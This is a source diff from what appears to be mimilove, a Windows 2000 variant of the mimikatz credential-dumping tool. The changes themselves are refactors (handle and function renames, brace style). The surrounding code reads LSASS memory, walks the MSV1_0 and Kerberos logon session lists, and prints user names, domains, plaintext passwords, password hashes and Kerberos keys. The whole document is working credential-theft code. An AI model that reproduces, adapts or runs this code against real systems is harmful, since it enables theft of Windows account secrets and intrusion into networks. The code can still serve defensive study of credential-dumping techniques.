@@ -51,8 +51,7 @@ int wmain(int argc, wchar_t *argv[])
 BOOL kuhl_m_sekurlsa_utils_love_search(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION mi, PKULL_M_MINI_PATTERN pa, PVOID * genericPtr)
 {
 	BOOL status = FALSE;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, mi->DllBase.hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, mi->DllBase.hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	KULL_M_MEMORY_SEARCH sMemory = {{{mi->DllBase.address, mi->DllBase.hMemory}, mi->SizeOfImage}, NULL};
 	aLocalMemory.address = pa->Pattern;
 	if(kull_m_memory_search(&aLocalMemory, pa->Length, &sMemory, FALSE))
@@ -89,8 +88,7 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 	KULL_M_MINI_PATTERN paLsasrv = {sizeof(PTRN_W2K_LogonSessionTable), PTRN_W2K_LogonSessionTable, -9};
 	PLIST_ENTRY LogonSessionTable = NULL;
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miLsasrv;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PVOID baseTable, base;
 	KIWI_MSV1_0_LOGON_SESSION_TABLE_50 table;
 	KIWI_MSV1_0_LIST_50 list;
@@ -152,9 +150,9 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 											{
 												if(aLsassMemory.address = entry.Credentials)
 												{
-													kull_m_string_getUnicodeString(&entry.UserName, hMemory);
-													kull_m_string_getUnicodeString(&entry.Domaine, hMemory);
-													kull_m_string_getSid(&entry.pSid, hMemory);
+													kull_m_process_getUnicodeString(&entry.UserName, hMemory);
+													kull_m_process_getUnicodeString(&entry.Domaine, hMemory);
+													kull_m_process_getSid(&entry.pSid, hMemory);
 
 													kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
 														L"Session           : %s from %u\n"
@@ -187,8 +185,8 @@ void mimilove_lsasrv(PKULL_M_MEMORY_HANDLE hMemory)
 																	aLocalMemory.address = &primaryCredentials;
 																	if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)))
 																	{
-																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
-																		kull_m_string_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
+																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Primary, hMemory);
+																		kull_m_process_getUnicodeString((PUNICODE_STRING) &primaryCredentials.Credentials, hMemory);
 
 																		kprintf(L"\t[%Z]\n", &primaryCredentials.Primary);
 																		if(RtlEqualString(&primaryCredentials.Primary, &PRIMARY_STRING, FALSE))
@@ -271,8 +269,7 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 	KULL_M_MINI_PATTERN paKerberos = {sizeof(PTRN_W2K_KerbLogonSessionList), PTRN_W2K_KerbLogonSessionList, -8};
 	PLIST_ENTRY KerbLogonSessionList = NULL;
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION miKerberos;
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
-	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &hLocalMemory};
+	KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, hMemory}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
 	PVOID base;
 	BYTE hash;
 	KIWI_KERBEROS_LOGON_SESSION_50 session;
@@ -303,9 +300,9 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 						{
 							if(session.Password.Length || session.pKeyList)
 							{
-								kull_m_string_getUnicodeString(&session.UserName, hMemory);
-								kull_m_string_getUnicodeString(&session.Domaine, hMemory);
-								kull_m_string_getUnicodeString(&session.Password, hMemory);
+								kull_m_process_getUnicodeString(&session.UserName, hMemory);
+								kull_m_process_getUnicodeString(&session.Domaine, hMemory);
+								kull_m_process_getUnicodeString(&session.Password, hMemory);
 
 								kprintf(L"Authentication Id : %u ; %u (%08x:%08x)\n"
 									L"User Name         : %wZ\n"
@@ -341,7 +338,7 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 													{
 														if(tmpBuffer.Buffer = (PWSTR) pKeys[i].generic.Checksump)
 														{
-															if(kull_m_string_getUnicodeString(&tmpBuffer, hMemory))
+															if(kull_m_process_getUnicodeString(&tmpBuffer, hMemory))
 															{
 																kull_m_string_wprintf_hex(tmpBuffer.Buffer, tmpBuffer.Length, 0); kprintf(L"\n");
 																LocalFree(tmpBuffer.Buffer);
@@ -367,7 +364,8 @@ void mimilove_kerberos(PKULL_M_MEMORY_HANDLE hMemory)
 							}
 							aLsassMemory.address = session.Entry.Flink;
 						}
-						else{
+						else
+						{
 							PRINT_ERROR_AUTO(L"kull_m_memory_copy / KIWI_KERBEROS_LOGON_SESSION_50");
 							break;
 						}
